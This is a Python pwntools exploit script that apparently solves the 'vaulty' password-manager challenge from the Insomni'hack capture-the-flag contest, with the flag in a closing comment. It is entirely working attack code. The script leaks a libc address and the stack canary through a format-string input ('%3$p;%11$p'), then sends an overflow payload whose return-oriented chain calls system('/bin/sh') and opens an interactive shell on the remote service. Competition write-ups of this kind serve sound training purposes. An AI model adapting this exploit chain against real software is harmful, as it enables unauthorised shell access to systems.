#!/usr/bin/env python3
import os.path

from pwn import *


exe = "vaulty-f5d5d6e5471b625659733cff28ece1b876c7fc228b014ce1f1bad7aa768c3790"


def connect():
    if args.LOCAL:
        return gdb.debug("./" + exe, api=True)
    else:
        return remote("vaulty.insomnihack.ch", 4556)


def main():
    with connect() as tube:
        if args.LOCAL:
            for name, addr in tube.libs().items():
                if os.path.basename(name) == exe:
                    pie = addr
                    break
            else:
                raise RuntimeError()
            tube.gdb.execute(f"b *0x{pie + 0x13a5:x}")
            tube.gdb.continue_nowait()
        tube.sendlineafter(b"1-5", b"1")
        tube.sendlineafter(b"Username:", b"%3$p;%11$p")
        tube.sendlineafter(b"Password:", b"")
        tube.sendlineafter(b"URL:", b"")
        tube.sendlineafter(b"1-5", b"4")
        tube.sendlineafter(b"0-0", b"0")
        tube.recvuntil(b"Username: ")
        libc, cookie = tube.recvline().split(b";")
        libc = int(libc, 16) - 0x114697
        cookie = int(cookie, 16)
        print(f"{libc=:x} {cookie=:x}")
        assert libc & 0xFFF == 0
        assert cookie & 0xFF == 0
        tube.sendlineafter(b"1-5", b"1")
        tube.sendlineafter(b"Username:", b"")
        tube.sendlineafter(b"Password:", b"")
        # pop_rdi = libc + 0x2a3e5
        pop_rdi_rbp = libc + 0x2A745
        bin_sh = libc + 0x1D8678
        system = libc + 0x50D70
        tube.sendlineafter(
            b"URL: ",
            flat(
                {
                    0x28: struct.pack("<Q", cookie),
                    0x48: struct.pack("<QQQQ", pop_rdi_rbp, bin_sh, 0, system),
                }
            ),
        )
        tube.interactive()  # INS{An0Th3r_P4SSw0RD_m4nag3r_h4ck3d}


if __name__ == "__main__":
    main()
